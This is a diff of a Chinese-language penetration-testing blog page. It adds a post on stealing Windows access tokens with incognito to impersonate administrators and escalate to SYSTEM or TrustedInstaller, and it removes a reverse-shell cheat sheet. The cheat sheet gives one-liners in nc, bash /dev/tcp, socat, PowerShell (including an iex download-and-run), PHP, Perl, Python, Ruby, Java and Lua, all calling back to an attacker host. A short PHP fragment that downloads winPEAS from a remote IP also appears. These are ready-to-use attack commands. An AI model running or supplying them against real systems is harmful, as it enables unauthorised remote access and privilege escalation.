@@ -118,6 +118,55 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/26/incognito-Stealing-Windows-Access-Tokens/" class="title">incognito Stealing Windows Access Tokens</a>
+    <section class="desc">
+  使用incognito可以窃取令牌以任意用户身份执行任意命令或payload
+得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌列出域管理组成员：
+net groups &quot;Domain Admins&quot; /domain0x01、ACCESS TOKEN(访问令牌)：
+当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权
+Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌
+0x02、令牌类型
+Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)
+Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)
+这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。
+0x03、本地和远程的基本用法
+本地： 
+查看 token：
+incognito.exe list_tokens–u 
+获取到已注销用户 int18\administrator的token,盗取token 执行命令： 
+incognito.exe execute -c &quot;int18\administrator&quot; calc.exe 远程：
+incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u
+incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe 
+0x04、提权、降权、伪造（以本地示例)
+incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system 
+incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 
+incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 0x03、获取TrustedInstaller 权限（修改系统文件）管理员、System 均无法修改系统文件、需 TrustedInstaller 权限借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限
+在CS下获取TrustedInstaller 
+
+shell sc strat TrustedInstaller 
+
+
+steal token  1700 ##ps查看TrustedInstaller进程号
+
+
+shell whoami /groups
+
+链接：
+https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/
+https://blog.csdn.net/qq_36374896/article/details/84261516  
+https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html 
+https://www.jianshu.com/p/907c6aab6fd0
+http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf
+
+
+</section>
+    <p class="sub">Apr 26, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/" class="title">域渗透之AD Recyle Bin组利用+Ldaps信息枚举</a>
     <section class="desc">
   AD Recyle Bin组利用：使用回收站还原用户，或获取用户旧密码进行碰撞
@@ -779,47 +828,6 @@ fclose($f);?&gt;kali@kali:~# php test.php
   </div>
 </div>-->
 <!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/19/Rerverse-shell-Interactive-shell/" class="title">Rerverse_shell&amp;Interactive_shell</a>
-    <section class="desc">
-  1、NC1.1、NC reverse shell1.1.1、-e参数（目标机器上执行）
-nc  《attack_ip》 《attack_port》 -e /bin/bash  1.1.2、没有-e参数（目标机器上执行）
-[1]/bin/sh | nc 《attack_ip》 《attack_port》
-[2] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 《attack_ip》 《attack_port》 &gt; /tmp/f   ###OpenBsd
-[3]nc -c bash 《attack_ip》 《attack_port》nc -lvvp attack_port  ###攻击机上执行
-1.2、NC Bind shellnc -lvvp 4444 -e /bin/bash  ###目标机器上执行
-nc victim_ip 4444    ###攻击机器执行2.BASH2.1、bash tcpbash -i&gt;＆/dev/tcp/《attack_ip》/《attack_port》 0&gt;＆1  ###目标机器上执行
-nc -lvvp attack_port   ###攻击机上执行2.2、bash udp目标机器上执行：  
-bash -i &gt;&amp; /dev/udp/《attack_ip》/《attack_port》 0&gt;&amp;1  ###目标机器上执行
-nc -u -lvp 《aattack_port》  ####攻击机上执行同样可以尝试其他类型shell：sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
-3、Socatsocat file:`tty`,raw,echo=0 TCP-L:《attack_port》  ####攻击机上执行
-socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:《attack_ip》:《attack_port》 ###目标机器上执行有些机器没有socat，需下载到目标机器：https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat 
-4、Telnet目标机器：
-telnet 《attack_ip》80 | /bin/bash | telnet 192.168.2.6 443攻击机：
-nc -lv 80
-nc -lv 4435、Powershell[1]
-powershell -nop -exec bypass -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&apos;《attack_ip》&apos;,《attack_port》);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;[2]Nishang : Invoke-PowerShellTcp.ps1
-powershell iex (New-Object Net.WebClient).DownloadString(&apos;http://&lt;yourwebserver&gt;/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 《attack_ip》 -Port 《attack_port》常见语言环境反弹shellPHP
-[1]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
-[2]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&apos;Perl
-perl -e &apos;use Socket;$i=&quot;《attack_ip》&quot;;$p=《attack_port》;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;Python
-python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;《attack_ip》&quot;,《attack_port》));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;Ruby
-ruby -rsocket -e&apos;f=TCPSocket.open(&quot;《attack_ip》&quot;,《attack_port》).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;JAVA
-r = Runtime.getRuntime() 
-p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/《attack_ip》/《attack_port》;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) 
-p.waitFor()Lua
-lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;《attack_ip》&apos;,&apos;《attack_port》&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;###linux only
-交互式shell：[1]监听时使用rlwraprlwrap nc -lvvp 4444[2]使用socatsocat file:`tty`,raw,echo=0 tcp-listen:4444[3]Spawn a TTY shell from an interpreter:/bin/sh -ipython -c ‘import pty; pty.spawn(“/bin/sh”)’python3 -c ‘import pty; pty.spawn(“/bin/sh”)’perl -e ‘exec “/bin/sh”;’
-[4]升级为tty shellctrl+zstty raw -echofg   ###这里输入不会显示，输入之后直接Enter即可
-
-
-</section>
-    <p class="sub">Apr 19, 2020</p>
-  </div>
-</div>-->
-<!---->
 <!--
   <nav class="pagination">
     <a class="extend prev" rel="prev" href="/">&lt;span class&#x3D;&quot;iconfont icon-arrow-left&quot;&gt;&lt;&#x2F;span&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
@@ -833,6 +841,70 @@ lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="incognito Stealing Windows Access Tokens" alt="incognito Stealing Windows Access Tokens" href="/2020/04/26/incognito-Stealing-Windows-Access-Tokens/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="incognito Stealing Windows Access Tokens" alt="incognito Stealing Windows Access Tokens"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; incognito Stealing Windows Access Tokens &gt;</div>
+                            <div class="content flex1">
+                                
+  使用incognito可以窃取令牌以任意用户身份执行任意命令或payload
+得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌列出域管理组成员：
+net groups &quot;Domain Admins&quot; /domain0x01、ACCESS TOKEN(访问令牌)：
+当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权
+Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌
+0x02、令牌类型
+Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)
+Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)
+这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。
+0x03、本地和远程的基本用法
+本地： 
+查看 token：
+incognito.exe list_tokens–u 
+获取到已注销用户 int18\administrator的token,盗取token 执行命令： 
+incognito.exe execute -c &quot;int18\administrator&quot; calc.exe 远程：
+incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u
+incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe 
+0x04、提权、降权、伪造（以本地示例)
+incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system 
+incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 
+incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 0x03、获取TrustedInstaller 权限（修改系统文件）管理员、System 均无法修改系统文件、需 TrustedInstaller 权限借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限
+在CS下获取TrustedInstaller 
+
+shell sc strat TrustedInstaller 
+
+
+steal token  1700 ##ps查看TrustedInstaller进程号
+
+
+shell whoami /groups
+
+链接：
+https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/
+https://blog.csdn.net/qq_36374896/article/details/84261516  
+https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html 
+https://www.jianshu.com/p/907c6aab6fd0
+http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" alt="域渗透之AD Recyle Bin组利用+Ldaps信息枚举" href="/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/"
                        class="post-item swiper-slide flex flex-v">
@@ -1618,62 +1690,6 @@ $data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);
 $f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);
 fwrite($f, $data[0]);
 fclose($f);?&gt;kali@kali:~# php test.php
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 19, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="Rerverse_shell&amp;Interactive_shell" alt="Rerverse_shell&amp;Interactive_shell" href="/2020/04/19/Rerverse-shell-Interactive-shell/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="Rerverse_shell&amp;Interactive_shell" alt="Rerverse_shell&amp;Interactive_shell"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; Rerverse_shell&amp;Interactive_shell &gt;</div>
-                            <div class="content flex1">
-                                
-  1、NC1.1、NC reverse shell1.1.1、-e参数（目标机器上执行）
-nc  《attack_ip》 《attack_port》 -e /bin/bash  1.1.2、没有-e参数（目标机器上执行）
-[1]/bin/sh | nc 《attack_ip》 《attack_port》
-[2] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 《attack_ip》 《attack_port》 &gt; /tmp/f   ###OpenBsd
-[3]nc -c bash 《attack_ip》 《attack_port》nc -lvvp attack_port  ###攻击机上执行
-1.2、NC Bind shellnc -lvvp 4444 -e /bin/bash  ###目标机器上执行
-nc victim_ip 4444    ###攻击机器执行2.BASH2.1、bash tcpbash -i&gt;＆/dev/tcp/《attack_ip》/《attack_port》 0&gt;＆1  ###目标机器上执行
-nc -lvvp attack_port   ###攻击机上执行2.2、bash udp目标机器上执行：  
-bash -i &gt;&amp; /dev/udp/《attack_ip》/《attack_port》 0&gt;&amp;1  ###目标机器上执行
-nc -u -lvp 《aattack_port》  ####攻击机上执行同样可以尝试其他类型shell：sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
-3、Socatsocat file:`tty`,raw,echo=0 TCP-L:《attack_port》  ####攻击机上执行
-socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:《attack_ip》:《attack_port》 ###目标机器上执行有些机器没有socat，需下载到目标机器：https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat 
-4、Telnet目标机器：
-telnet 《attack_ip》80 | /bin/bash | telnet 192.168.2.6 443攻击机：
-nc -lv 80
-nc -lv 4435、Powershell[1]
-powershell -nop -exec bypass -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&apos;《attack_ip》&apos;,《attack_port》);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;[2]Nishang : Invoke-PowerShellTcp.ps1
-powershell iex (New-Object Net.WebClient).DownloadString(&apos;http://&lt;yourwebserver&gt;/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 《attack_ip》 -Port 《attack_port》常见语言环境反弹shellPHP
-[1]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
-[2]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&apos;Perl
-perl -e &apos;use Socket;$i=&quot;《attack_ip》&quot;;$p=《attack_port》;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;Python
-python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;《attack_ip》&quot;,《attack_port》));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;Ruby
-ruby -rsocket -e&apos;f=TCPSocket.open(&quot;《attack_ip》&quot;,《attack_port》).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;JAVA
-r = Runtime.getRuntime() 
-p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/《attack_ip》/《attack_port》;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) 
-p.waitFor()Lua
-lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;《attack_ip》&apos;,&apos;《attack_port》&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;###linux only
-交互式shell：[1]监听时使用rlwraprlwrap nc -lvvp 4444[2]使用socatsocat file:`tty`,raw,echo=0 tcp-listen:4444[3]Spawn a TTY shell from an interpreter:/bin/sh -ipython -c ‘import pty; pty.spawn(“/bin/sh”)’python3 -c ‘import pty; pty.spawn(“/bin/sh”)’perl -e ‘exec “/bin/sh”;’
-[4]升级为tty shellctrl+zstty raw -echofg   ###这里输入不会显示，输入之后直接Enter即可
 
 
 
